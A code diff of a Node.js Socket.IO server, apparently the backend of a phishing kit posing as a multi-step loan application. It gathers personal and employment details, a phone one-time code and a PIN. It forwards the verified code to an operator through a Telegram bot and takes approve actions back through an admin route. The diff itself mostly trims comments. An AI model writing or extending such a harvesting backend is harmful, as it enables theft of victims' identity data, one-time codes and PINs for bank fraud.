@@ -15,10 +15,9 @@ const io = new Server(server, { cors: { origin: "*" } });
 const sessions = new Map();
 
 io.on('connection', (socket) => {
-    // Initialize session with the socket ID
-    sessions.set(socket.id, { data: { socketId: socket.id } });
+    sessions.set(socket.id, { data: { socketId: socket.id }, otp: null });
 
-    // --- STEP 1: LOAN DETAILS ---
+    // STEP 1
     socket.on('step1', (data) => {
         const session = sessions.get(socket.id);
         if (session) {
@@ -27,7 +26,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- STEP 2: PERSONAL INFO ---
+    // STEP 2
     socket.on('step2', (data) => {
         const session = sessions.get(socket.id);
         if (session) {
@@ -36,7 +35,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- STEP 3: EMPLOYMENT ---
+    // STEP 3
     socket.on('step3-data', (data) => {
         const session = sessions.get(socket.id);
         if (session) {
@@ -45,7 +44,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- STEP 4 (PART A): GENERATE OTP (NO TELEGRAM ALERT YET) ---
+    // STEP 4 - GENERATE (No Telegram Alert)
     socket.on('send-otp', (data) => {
         const otp = Math.floor(1000 + Math.random() * 9000).toString();
         const session = sessions.get(socket.id);
@@ -53,15 +52,15 @@ io.on('connection', (socket) => {
             session.otp = otp;
             session.data.phone = data.phoneNumber;
             console.log(`[OTP] Generated for ${socket.id}: ${otp}`);
-            socket.emit('otp-sent'); // Tells HTML to show the input field
+            socket.emit('otp-sent');
         }
     });
 
-    // --- STEP 4 (PART B): VERIFY OTP (TRIGGERS TELEGRAM ALERT) ---
+    // STEP 4 - VERIFY (Triggers Telegram Alert)
     socket.on('step4-otp', (data) => {
         const session = sessions.get(socket.id);
         if (session && session.otp === data.otp) {
-            // Send the alert to Telegram ONLY now because the user filled it
+            // SUCCESS: Only now we tell the Admin
             botManager.sendStep4({ socketId: socket.id, otp: data.otp });
             socket.emit('otp-verified');
         } else {
@@ -69,7 +68,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- STEP 5: PIN SUBMITTED ---
+    // STEP 5
     socket.on('step5-pin', (data) => {
         const session = sessions.get(socket.id);
         if (session) {
@@ -81,7 +80,6 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => sessions.delete(socket.id));
 });
 
-// Admin Route for Telegram Buttons
 app.post('/admin/action', (req, res) => {
     const { socketId, action } = req.body;
     if (action === 'approve') {
@@ -92,7 +90,6 @@ app.post('/admin/action', (req, res) => {
     res.sendStatus(200);
 });
 
-// Bind to 0.0.0.0 for Render Production
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Production Server Live on Port ${PORT}`);
 });
